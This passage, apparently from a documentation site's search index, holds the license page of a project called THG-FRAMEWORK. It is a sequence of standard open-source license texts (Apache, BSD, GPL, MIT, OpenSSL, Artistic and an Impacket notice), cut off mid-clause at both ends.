Version 2.0, January 2004 http://www.apache.org/licenses/ . TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION . 1. Definitions. . \"License\" shall mean the terms and conditions for use, reproduction, and distribution as defined by Sections 1 through 9 of this document. . \"Licensor\" shall mean the copyright owner or entity authorized by the copyright owner that is granting the License. . \"Legal Entity\" shall mean the union of the acting entity and all other entities that control, are controlled by, or are under common control with that entity. For the purposes of this definition, \"control\" means (i) the power, direct or indirect, to cause the direction or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty percent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. . \"You\" (or \"Your\") shall mean an individual or Legal Entity exercising permissions granted by this License. . \"Source\" form shall mean the preferred form for making modifications, including but not limited to software source code, documentation source, and configuration files. . \"Object\" form shall mean any form resulting from mechanical transformation or translation of a Source form, including but not limited to compiled object code, generated documentation, and conversions to other media types. . \"Work\" shall mean the work of authorship, whether in Source or Object form, made available under the License, as indicated by a copyright notice that is included in or attached to the work (an example is provided in the Appendix below). . \"Derivative Works\" shall mean any work, whether in Source or Object form, that is based on (or derived from) the Work and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship. For the purposes of this License, Derivative Works shall not include works that remain separable from, or merely link (or bind by name) to the interfaces of, the Work and Derivative Works thereof. . \"Contribution\" shall mean any work of authorship, including the original version of the Work and any modifications or additions to that Work or Derivative Works thereof, that is intentionally submitted to Licensor for inclusion in the Work by the copyright owner or by an individual or Legal Entity authorized to submit on behalf of the copyright owner. For the purposes of this definition, \"submitted\" means any form of electronic, verbal, or written communication sent to the Licensor or its representatives, including but not limited to communication on electronic mailing lists, source code control systems, and issue tracking systems that are managed by, or on behalf of, the Licensor for the purpose of discussing and improving the Work, but excluding communication that is conspicuously marked or otherwise designated in writing by the copyright owner as \"Not a Contribution.\" . \"Contributor\" shall mean Licensor and any individual or Legal Entity on behalf of whom a Contribution has been received by Licensor and subsequently incorporated within the Work. . 2. Grant of Copyright License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, sublicense, and distribute the Work and such Derivative Works in Source or Object form. . 3. Grant of Patent License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable (except as stated in this section) patent license to make, have made, use, offer to sell, sell, import, and otherwise transfer the Work, where such license applies only to those patent claims licensable by such Contributor that are necessarily infringed by their Contribution(s) alone or by combination of their Contribution(s) with the Work to which such Contribution(s) was submitted. If You institute patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Work or a Contribution incorporated within the Work constitutes direct or contributory patent infringement, then any patent licenses granted to You under this License for that Work shall terminate as of the date such litigation is filed. . 4. Redistribution. You may reproduce and distribute copies of the Work or Derivative Works thereof in any medium, with or without modifications, and in Source or Object form, provided that You meet the following conditions: . (a) You must give any other recipients of the Work or Derivative Works a copy of this License; and . (b) You must cause any modified files to carry prominent notices stating that You changed the files; and . \u00a9 You must retain, in the Source form of any Derivative Works that You distribute, all copyright, patent, trademark, and attribution notices from the Source form of the Work, excluding those notices that do not pertain to any part of the Derivative Works; and . (d) If the Work includes a \"NOTICE\" text file as part of its distribution, then any Derivative Works that You distribute must include a readable copy of the attribution notices contained within such NOTICE file, excluding those notices that do not pertain to any part of the Derivative Works, in at least one of the following places: within a NOTICE text file distributed as part of the Derivative Works; within the Source form or documentation, if provided along with the Derivative Works; or, within a display generated by the Derivative Works, if and wherever such third-party notices normally appear. The contents of the NOTICE file are for informational purposes only and do not modify the License. You may add Your own attribution notices within Derivative Works that You distribute, alongside or as an addendum to the NOTICE text from the Work, provided that such additional attribution notices cannot be construed as modifying the License. . You may add Your own copyright statement to Your modifications and may provide additional or different license terms and conditions for use, reproduction, or distribution of Your modifications, or for any such Derivative Works as a whole, provided Your use, reproduction, and distribution of the Work otherwise complies with the conditions stated in this License. . 5. Submission of Contributions. Unless You explicitly state otherwise, any Contribution intentionally submitted for inclusion in the Work by You to the Licensor shall be under the terms and conditions of this License, without any additional terms or conditions. Notwithstanding the above, nothing herein shall supersede or modify the terms of any separate license agreement you may have executed with Licensor regarding such Contributions. . 6. Trademarks. This License does not grant permission to use the trade names, trademarks, service marks, or product names of the Licensor, except as required for reasonable and customary use in describing the origin of the Work and reproducing the content of the NOTICE file. . 7. Disclaimer of Warranty. Unless required by applicable law or agreed to in writing, Licensor provides the Work (and each Contributor provides its Contributions) on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. You are solely responsible for determining the appropriateness of using or redistributing the Work and assume any risks associated with Your exercise of permissions under this License. . 8. Limitation of Liability. In no event and under no legal theory, whether in tort (including negligence), contract, or otherwise, unless required by applicable law (such as deliberate and grossly negligent acts) or agreed to in writing, shall any Contributor be liable to You for damages, including any direct, indirect, special, incidental, or consequential damages of any character arising as a result of this License or out of the use or inability to use the Work (including but not limited to damages for loss of goodwill, work stoppage, computer failure or malfunction, or any and all other commercial damages or losses), even if such Contributor has been advised of the possibility of such damages. . 9. Accepting Warranty or Additional Liability. While redistributing the Work or Derivative Works thereof, You may choose to offer, and charge a fee for, acceptance of support, warranty, indemnity, or other liability obligations and/or rights consistent with this License. However, in accepting such obligations, You may act only on Your own behalf and on Your sole responsibility, not on behalf of any other Contributor, and only if You agree to indemnify, defend, and hold each Contributor harmless for any liability incurred by, or claims asserted against, such Contributor by reason of your accepting any such warranty or additional liability. . END OF TERMS AND CONDITIONS . APPENDIX: How to apply the Apache License to your work. . To apply the Apache License to your work, attach the following boilerplate notice, with the fields enclosed by brackets \"[]\" replaced with your own identifying information. (Don't include the brackets!) The text should be enclosed in the appropriate comment syntax for the file format. We also recommend that a file or class name and description of purpose be included on the same \"printed page\" as the copyright notice for easier identification within third-party archives. . Copyright [yyyy] [name of copyright owner] . Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at . http://www.apache.org/licenses/LICENSE-2.0 . Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. License: Zlib This software is provided 'as-is', without any express or implied warranty. In no event will the authors be held liable for any damages arising from the use of this software. . Permission is granted to anyone to use this software for any purpose, including commercial applications, and to alter it and redistribute it freely, subject to the following restrictions: . 1. The origin of this software must not be misrepresented; you must not claim that you wrote the original software. If you use this software in a product, an acknowledgment in the product documentation would be appreciated but is not required. 2. Altered source versions must be plainly marked as such, and must not be misrepresented as being the original software. 3. This notice may not be removed or altered from any source distribution.","title":"LICENSE"},{"location":"LICENSE/#the-thg-framework-is-provided-under-the-3-clause-bsd-license-provided","text":"","title":"The THG-FRAMEWORK is provided under the 3-clause BSD license provided"},{"location":"LICENSE/#at-the-end-of-this-file","text":"","title":"at the end of this file."},{"location":"LICENSE/#the-copyright-on-this-package-is-held-by-darkcode0x00-inc","text":"","title":"The copyright on this package is held by darkcode0x00, Inc."},{"location":"LICENSE/#this-license-does-not-apply-to-third-party-components-detailed-below","text":"","title":"This license does not apply to third-party components detailed below."},{"location":"LICENSE/#last-updated-2018-nov-04","text":"License: BSD-2-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . THIS SOFTWARE IS PROVIDED BY {{THE COPYRIGHT HOLDERS AND CONTRIBUTORS}} \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL {{THE COPYRIGHT HOLDER OR CONTRIBUTORS}} BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: BSD-3-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . * Neither the name of darkcode0x00, Inc. nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. . THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: BSD-4-clause Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 3. All advertising materials mentioning features or use of this software must display the following acknowledgement: This product includes software developed by the . 4. Neither the name of the nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. . THIS SOFTWARE IS PROVIDED BY ''AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Ruby 1. You may make and give away verbatim copies of the source form of the software without restriction, provided that you duplicate all of the original copyright notices and associated disclaimers. . 2. You may modify your copy of the software in any way, provided that you do at least ONE of the following: . a) place your modifications in the Public Domain or otherwise make them Freely Available, such as by posting said modifications to Usenet or an equivalent medium, or by allowing the author to include your modifications in the software. . b) use the modified software only within your corporation or organization. . c) rename any non-standard executables so the names do not conflict with standard executables, which must also be provided. . d) make other distribution arrangements with the author. . 3. You may distribute the software in object code or executable form, provided that you do at least ONE of the following: . a) distribute the executables and library files of the software, together with instructions (in the manual page or equivalent) on where to get the original distribution. . b) accompany the distribution with the machine-readable source of the software. . c) give non-standard executables non-standard names, with instructions on where to get the original software distribution. . d) make other distribution arrangements with the author. . 4. You may modify and include the part of the software into any other software (possibly commercial). But some files in the distribution are not written by the author, so that they are not under this terms. They are gc.c(partly), utils.c(partly), regex.[ch], fnmatch.[ch], glob.c, st.[ch] and some files under the ./missing directory. See each file for the copying condition. . 5. The scripts and library files supplied as input to or produced as output from the software do not automatically fall under the copyright of the software, but belong to whomever generated them, and may be sold commercially, and may be aggregated with this software. . 6. THIS SOFTWARE IS PROVIDED \"AS IS\" AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE. License: GPL-2 This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version. . This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. . You should have received a copy of the GNU General Public License along with this package; if not, write to the Free Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA . On Debian systems, the full text of the GNU General Public License version 2 can be found in the file `/usr/share/common-licenses/GPL-2'. License: LGPL-2.1 This library is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General Public License as published by the Free Software Foundation; either version 2.1 of the License, or (at your option) any later version. . This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more details. . You should have received a copy of the GNU Lesser General Public License along with this library; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA License: OpenSSL Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . 3. All advertising materials mentioning features or use of this software must display the following acknowledgment: \"This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. ( http://www.openssl.org/ )\" . 4. The names \"OpenSSL Toolkit\" and \"OpenSSL Project\" must not be used to endorse or promote products derived from this software without prior written permission. For written permission, please contact openssl-core@openssl.org . . 5. Products derived from this software may not be called \"OpenSSL\" nor may \"OpenSSL\" appear in their names without prior written permission of the OpenSSL Project. . 6. Redistributions of any form whatsoever must retain the following acknowledgment: \"This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit ( http://www.openssl.org/ )\" . THIS SOFTWARE IS PROVIDED BY THE OpenSSL PROJECT `AS IS'' AND ANY EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE OpenSSL PROJECT OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. . This product includes cryptographic software written by Eric Young ( eay@cryptsoft.com ). This product includes software written by Tim Hudson ( tjh@cryptsoft.com ). License: SSLeay This package is an SSL implementation written by Eric Young ( eay@cryptsoft.com ). The implementation was written so as to conform with Netscapes SSL. . This library is free for commercial and non-commercial use as long as the following conditions are aheared to. The following conditions apply to all code found in this distribution, be it the RC4, RSA, lhash, DES, etc., code; not just the SSL code. The SSL documentation included with this distribution is covered by the same copyright terms except that the holder is Tim Hudson ( tjh@cryptsoft.com ). . Copyright remains Eric Young's, and as such any Copyright notices in the code are not to be removed. If this package is used in a product, Eric Young should be given attribution as the author of the parts of the library used. This can be in the form of a textual message at program startup or in documentation (online or textual) provided with the package. . Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. 3. All advertising materials mentioning features or use of this software must display the following acknowledgement: \"This product includes cryptographic software written by Eric Young ( eay@cryptsoft.com )\" The word 'cryptographic' can be left out if the rouines from the library being used are not cryptographic related :-). 4. If you include any Windows specific code (or a derivative thereof) from the apps directory (application code) you must include an acknowledgement: \"This product includes software written by Tim Hudson ( tjh@cryptsoft.com )\" . THIS SOFTWARE IS PROVIDED BY ERIC YOUNG `AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. . The licence and distribution terms for any publically available version or derivative of this code cannot be changed. i.e. this code cannot simply be copied and put under another distribution licence [including the GNU Public Licence.] License: MIT Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: . The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. . THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. License: Artistic Copyright \u00a9 2000-2006, The Perl Foundation. . Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. . Preamble . This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software. . You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement. . Definitions . \"Copyright Holder\" means the individual(s) or organization(s) named in the copyright notice for the entire Package. . \"Contributor\" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures. . \"You\" and \"your\" means any person who would like to copy, distribute, or modify the Package. . \"Package\" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version. . \"Distribute\" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization. . \"Distributor Fee\" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees. . \"Standard Version\" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder. . \"Modified Version\" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder. . \"Original License\" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future. . \"Source\" form means the source code, documentation source, and configuration files for the Package. . \"Compiled\" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form. . Permission for Use and Modification Without Distribution . (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version. . . Permissions for Redistribution of the Standard Version . (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package. . (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License. . . Distribution of Modified Versions of the Package as Source . (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following: . (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version. . (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version. . \u00a9 allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under . (i) the Original License or . (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed. . . Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source . (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license. . (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version. . . Aggregating or Linking the Package . (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation. . (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package. . . Items That are Not Considered Part of a Modified Version . (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license. . . General Provisions . (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license. . (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license. . (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder. . (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed. . (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS \"AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Apache Version 1.1, 2000 Modifications by CORE Security Technologies . Copyright \u00a9 2000 The Apache Software Foundation. All rights reserved. . Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: . 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. . 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. . 3. The end-user documentation included with the redistribution, if any, must include the following acknowledgment: \"This product includes software developed by CORE Security Technologies ( http://www.coresecurity.com/ ).\" Alternately, this acknowledgment may appear in the software itself, if and wherever such third-party acknowledgments normally appear. . 4. The names \"Impacket\" and \"CORE Security Technologies\" must not be used to endorse or promote products derived from this software without prior written permission. For written permission, please contact oss@coresecurity.com . . 5. Products derived from this software may not be called \"Impacket\", nor may \"Impacket\" appear in their name, without prior written permission of CORE Security Technologies. . THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESSED OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE APACHE SOFTWARE FOUNDATION OR ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. License: Apache Version 2.0, January 2004 http://www.apache.org/licenses/ . TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION . 1. Definitions. . \"License\" shall mean the terms and conditions for use, reproduction, and distribution as defined by Sections 1 through 9 of this document. . \"Licensor\" shall mean the copyright owner or entity authorized by the copyright owner that is granting the License. . \"Legal Entity\" shall mean the union of the acting entity and all other entities that control, are controlled by, or are under common control with that entity. For the purposes of this definition, \"control\" means (i) the power, direct or indirect, to cause the direction or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty percent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. . \"You\" (or \"Your\") shall mean an individual or Legal Entity exercising permissions granted by this License. . \"Source\" form shall mean the preferred form for making modifications, including but not limited to software source code, documentation source, and configuration files. . \"Object\" form shall mean any form resulting from mechanical transformation or translation of a Source form, including but not limited to compiled object code, generated documentation, and conversions to other media types. . \"Work\" shall mean the work of authorship, whether in Source or Object form, made available under the License, as indicated by a copyright notice that is included in or attached to the work (an example is provided in the Appendix below). . \"Derivative Works\" shall mean any work, whether in Source or Object form, that is based on (or derived from) the Work and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship. For the purposes of this License, Derivative Works shall not include works that remain separable from, or merely link (or bind by name) to the interfaces of, the Work and Derivative Works thereof. . \"Contribution\" shall mean any work of authorship, including the original version of the Work and any modifications or additions to that Work or Derivative Works thereof, that is intentionally submitted to Licensor for inclusion in the Work by the copyright owner or by an individual or Legal Entity authorized to submit on behalf of the copyright owner. For the purposes of this definition, \"submitted\" means any form of electronic, verbal, or written communication sent to the Licensor or its representatives, including but not limited to communication on electronic mailing lists, source code control systems, and issue tracking systems that are managed by, or on behalf of, the Licensor for the purpose of discussing and improving the Work, but excluding communication that is conspicuously marked or otherwise designated in writing by the copyright owner as \"Not a Contribution.\" . \"Contributor\" shall mean Licensor and any individual or Legal Entity on behalf of whom a Contribution has been received by Licensor and subsequently incorporated within the Work. . 2. Grant of Copyright License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, sublicense, and distribute the Work and such Derivative Works in Source or Object form. . 3. Grant of Patent License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable (except as stated in this section) patent license to make, have made, use, offer to sell, sell, import, and otherwise transfer the Work, where such license applies only to those patent claims licensable by such Contributor that are necessarily infringed by their Contribution(s) alone or by combination of their Contribution(s) with the Work to which such Contribution(s) was submitted. If You institute patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Work or a Contribution incorporated within the Work constitutes direct or contributory patent infringement, then any patent licenses granted to You under this License for that Work shall terminate as of the date such litigation is filed. . 4. Redistribution. You may reproduce and distribute copies of the Work or Derivative Works thereof in any medium, with or without modifications, and in Source or Object form, provided that You meet the following conditions: . (a) You must give any other recipients of the Work or Derivative Works a copy of this License; and 